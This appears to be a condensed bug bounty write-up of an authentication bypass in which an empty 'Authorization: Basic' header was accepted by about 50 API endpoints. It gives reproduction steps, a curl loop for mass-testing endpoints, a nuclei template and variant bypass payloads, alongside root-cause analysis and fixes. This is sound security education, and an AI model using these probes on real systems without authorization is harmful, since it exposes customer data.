# Auth Bypass - No Username. No Password. Just a Header - $3,000 Critical (Original: ALR on Medium, 2026)

> Original: https://medium.com/@0xalr/no-username-no-password-just-a-header-a-3-000-authentication-bypass-9b42432b6c69 | Reporter: ALR (Abdalkreem Dagga) | Disclosed: 2026-06-03 | Severity: Critical | Bounty: $3,000

## 1. TL;DR for Hunters
A subdomain redirected to a login page for auth. Hunter read the page JS, extracted ~50 API endpoints. Every endpoint returned `401 Unauthorized`. Question asked: "How does the app decide a user is authenticated?" Answer found in JS: it sends `Authorization: Basic <b64(user:pass)>`. Hunter sent `Authorization: Basic` with empty value → server said 200 OK. The backend checked only that the header EXISTS, never decoded/validated it. Worked on ~50 endpoints (view/create/modify/delete customer data + internal settings). Critical, $3,000.

## 2. Attack Surface & Context
- Flow: `subdomain enum (amass/subfinder) → subdomain redirects to auth host → view-source of login page → JS file → grep endpoints → Burp tests → 401 everywhere → trace auth logic in JS → found Authorization header builder → empty `Basic` value bypasses`.
- Tech: SPA + JSON API. Auth = HTTP Basic Authentication (scheme `Basic`, base64 username:password). Likely backend: any web app with a naive middleware that does `if (header present) allow`.
- Hunt same class:
  - Any `Authorization` header on API endpoints. Try `Authorization: Basic`, `Authorization: Bearer`, `Authorization: Bearer ``, empty, garbage.
  - Apps that send `Authorization: Basic` from JS via `n1.set("Authorization", ...)` — this string pattern `"Basic " +` or `n1.set(` in a JS bundle is a strong SM (source marker).
  - Login redirect + API subdomain pairs: one host authenticates, another host serves API. Check if API trusts header presence, not value.
  - Intranet/internal tools with pre-shared tokens, API gateways using custom `X-API-Key` presence checks.

## 3. Concepts Explained Simply (word-by-word)

HTTP Basic Authentication:
```http
Authorization: Basic dXNlcjpwYXNz
```
- `Authorization` = the header name. Header = `name: value` line sent with a request.
- `Basic` = the auth scheme key word. "Basic" tells server "credentials are base64(user:pass)".
- `dXNlcjpwYXNz` = base64 of `user:pass`. base64 = a way to write bytes as safe letters. Long story short: `username:password` gets encoded.

The JS snippet that builds it (word by word):
```js
a1 && n1.set(
    "Authorization",
    "Basic " +
    btoa(
        (a1.username || "") + ":" +
        (a1.password ? unescape(encodeURIComponent(a1.password)) : "")
    )
)
```
- `a1` = the variable holding the login form values (username, password).
- `&&` = "and". If `a1` exists, run the right side.
- `n1.set("Authorization", ...)` = set request header named `Authorization` to the computed value.
- `"Basic " + btoa(...)` = string `"Basic "` followed by base64.
- `btoa(...)` = "binary to ASCII" — JavaScript's built-in base64 encoder.
- `(a1.username || "")` = take username, or `""` if empty. `||` = "or fallback".
- `":"` = the separator between username and password.
- `a1.password ? ... : ""` = if password exists, encode it, else use `""`. Ternary = if/else in one line.
- `encodeURIComponent/unescape` = URL-safe encoding then inverse — protects passwords with special chars.

Whole sentence: "If login form exists, build an Authorization header = 'Basic' + base64(username + ':' + password)."

The BUG — what the attacker sent instead:
```http
Authorization: Basic
```
- Same header name, same scheme keyword, but NO base64 credentials after it.
- Empty value after the space. No `user:pass`, nothing.
- Server answered 200 OK instead of 401.

Why is that a bug? A correct server does:
```
if header missing: return 401
decode base64 credentials
if no valid username/password: return 401
allow request
```
This server did:
```
if header present with "Basic" prefix: allow ✅ (no decode, no validation)
else: return 401
```

## 4. Step-by-Step Reproduction (with examples)

Step 1 - Enumerate subdomains:
```bash
subfinder -d target.com -silent | httpx -status-code | grep -v " 200"
# or amass enum, or assetfinder. Goal: find unusual subdomains.
```

Step 2 - A subdomain redirects to an auth/login host. Instead of following the redirect, view source (Ctrl+U).

Step 3 - Grep the JS bundle for endpoints + the auth builder:
```bash
# download all JS
grep -ohE '"/api/[^"]+"' app.js          # extract endpoints
grep -n "Authorization\|btoa\|n1.set" app.js   # find auth logic
```

Step 4 - Open Burp → Repeater. Send a request to any endpoint with NO auth header. Expect `401 Unauthorized`.

Step 5 - Important mental move (this is the whole trick): don't keep fuzzing values. ASK "How does the server know I'm logged in?" Then answer it from the JS, not from guessing.

Step 6 - Add the empty header:
```http
POST /api/v1/customers/list HTTP/1.1
Host: api.target.com
Content-Type: application/json
Authorization: Basic

{}
```

Step 7 - Response: `200 OK` with data. Now mass-test all ~50 endpoints:
```bash
# loop all extracted endpoints, same empty header
while read e; do
  curl -s -o /dev/null -w "$e %{http_code}\n" \
    -X GET "https://api.target.com$e" \
    -H "Authorization: Basic"
done < endpoints.txt
```

Step 8 - Confirm impact scope: find endpoints that create/modify/delete customer data + internal settings and show real read/write in a report (safe: use your own test account, dump own data, capture one response as proof).

(Note: if `Authorization: Basic ` alone 404s/400s, also try `Authorization:` (empty value), `Authorization: Basic YWxhZGluOnBhc3N3b3Jk` (well-known junk creds) and `Authorization: Bearer`.)

## 5. Root Cause Analysis
```js
// VULNERABLE (conceptual middleware)
function auth(req, res, next) {
  const h = req.headers['authorization'];
  if (h && h.startsWith('Basic ')) {   // ❌ only checks presence + prefix
    req.user = 'authenticated';
    return next();
  }
  return res.status(401).end();
}

// FIXED
function auth(req, res, next) {
  const h = req.headers['authorization'];
  if (!h || !h.startsWith('Basic ')) return res.status(401).end(); // missing/format
  const b64 = h.slice(6);                 // take real credentials part
  if (!b64) return res.status(401).end(); // empty creds → reject ❗
  let [user, pass] = Buffer.from(b64, 'base64').toString().split(':');
  if (!verify_user_pass(user, pass)) return res.status(401).end(); // real check
  req.user = user;
  return next();
}
```
- Missing check: credential string exists AND (username/password) validates against the user store.
- Missing check 2: no decode at all — `Basic` with nothing after counts as "a header present".
- The `.startsWith('Basic ')` passes for `Authorization: Basic` because the string literal `"Basic "` (with trailing space) is the entire value? No — value is `Basic ` exactly, `startsWith('Basic ')` = true. The bug is that nothing AFTER the prefix is validated/required.

## 6. Why It Slipped Past Devs
- Dev wrote the middleware thinking "if someone sends the header, it's because the real frontend built real creds." Assumed the client can't be faked.
- The frontend always sends valid base64, so in normal use nobody ever sees empty creds.
- The check "letter starts with Basic" passed in code review because it LOOKS like an auth check; real auth = verify against DB.
- No negative test in CI (no test for missing password, empty token, trailing-space header).
- Classic "presence is not verification" — called a fail-open/fail-closed confusion: they built fail-OPEN (missing credentials = allowed) thinking it was fail-CLOSED.

## 7. Advanced Completions - How to Take It Further
1. Every scheme: after `Basic`, try `Bearer`, `Digest`, `Token`, `token`, `AWS4-HMAC-SHA256` — many gates are scheme-name checks.
2. Empty variants: `Authorization:`, `Authorization: `, `Authorization:\t`, `Authorization: Basic`, double space `Basic  `, lowercase `basic`.
3. Header-name confusion: `Proxy-Authorization: Basic`, `X-Authorization: Basic`, `X-API-Key:`, `Authorization: Basic =` — proxy/waf vs app layer mismatches.
4. Method override + header: if GET blocked, `X-HTTP-Method-Override: DELETE`, `POST /x?_method=DELETE` with the empty header.
5. Chain with IDOR/SSRF: raw 200 on internal endpoints means you can now reach admin APIs — enumerate more from JS sourcemaps, Swagger (`/swagger.json`, `/openapi.json`, `/v2/api-docs`).
6. Mass scale: at 50 endpoints, automate the check (ffuf/autorize style) so the report shows breadth = higher payout/severity.
7. Related logic: same "presence not validation" pattern appears on `X-Forwarded-For` (IP allowlist), `Origin`, `Referer`, `Cookie: session=1`, `X-Admin: true`.
8. Version differences: old API (`/v1`) fixed, check `/v2`, `/api/`, `/api/v14/` — bypass often persists on shadow copies.

## 8. Hunting Methodology Checklist
- [ ] Enumerate subdomains, find ones that redirect to a separate auth host
- [ ] View source of login page (don't follow the redirect blindly)
- [ ] Download all JS, grep `api`, `endpoint`, `Authorization`, `btoa`, `n1.set`, `Bearer`
- [ ] Extract endpoint list (regex `"/[a-z0-9_/-]*\.(json)?[^"]*"` or grep `"/api/`)
- [ ] Confirm baseline 401 WITHOUT header (save response!)
- [ ] Add `Authorization: Basic` empty → 200? Document the diff
- [ ] Confirm 401 still normal for WRONG creds (`Basic dXNlcjpwYXNz`)
- [ ] Mass-test all endpoints, count success (breadth = impact)
- [ ] Find highest-impact one (read customer data / write / delete / admin)
- [ ] Capture proof: one before/after request pair, redact sensitive data
- [ ] Report: reproduce steps, root cause hypothesis, fix suggestion, scope breadth

## 9. Automation
nuclei template:
```yaml
id: basic-auth-header-presence-bypass
info:
  name: Authorization header presence bypass
  severity: critical
  tags: auth-bypass,api
http:
  - raw:
      - |
        GET /{{path}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic
    redirects: false
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["jwt", "token", "user", "email", "data"]
```
Or simple bash loop (step 7). Or Burp: Intruder with `Authorization: Basic` on 50 endpoints, filter 200.

## 10. Mitigation & Fix Review
- Correct fix: (1) require the full `scheme + base64` shape, (2) decode, (3) verify username/password against the store, (4) default REJECT on any malformed/empty input (fail-closed).
- Verify patch: send `Authorization: Basic`, `Authorization:` and garbage creds — all must be 401. `Authorization: Basic dXNlcjpwYXNz` valid → 200 only if creds real.
- Extra: rate-limit + log failed auth, WAF rule blocking empty-credential Authorization headers, don't leak which header is checked in client JS (ideally auth handled by gateway, not app).

## 11. Practice Lab
- Local: tiny Express app. Middleware: `if (req.headers.authorization && req.headers.authorization.startsWith('Basic ')) next()`. Seed 2 endpoints. curl tests → see bypass live.
- PortSwigger-style: any lab with "authentication" — but the exact class is easy to self-build. Try on intentionally vulnerable targets (DVWA/TryHackMe) and on in-scope APIs with Custom headers — never on prod without permission.
- Practice payload with curl:
```bash
curl -i -X GET https://YOUR-EXPRESS:3000/admin -H "Authorization: Basic"
# vs
curl -i -X GET https://YOUR-EXPRESS:3000/admin   # -> 401
```

## 12. Key Takeaway for Daily Hunting
When you see a 401, don't fuzz blindly. Ask "WHAT exactly does the server check?" — read the client's auth code and mirror the exact header/scheme it builds. Then send the header with an EMPTY value. "Presence check, not value check" is one of the cheapest Criticals in bug bounty. Grep today: `Authorization", "Basic` and `.startsWith('Basic')`.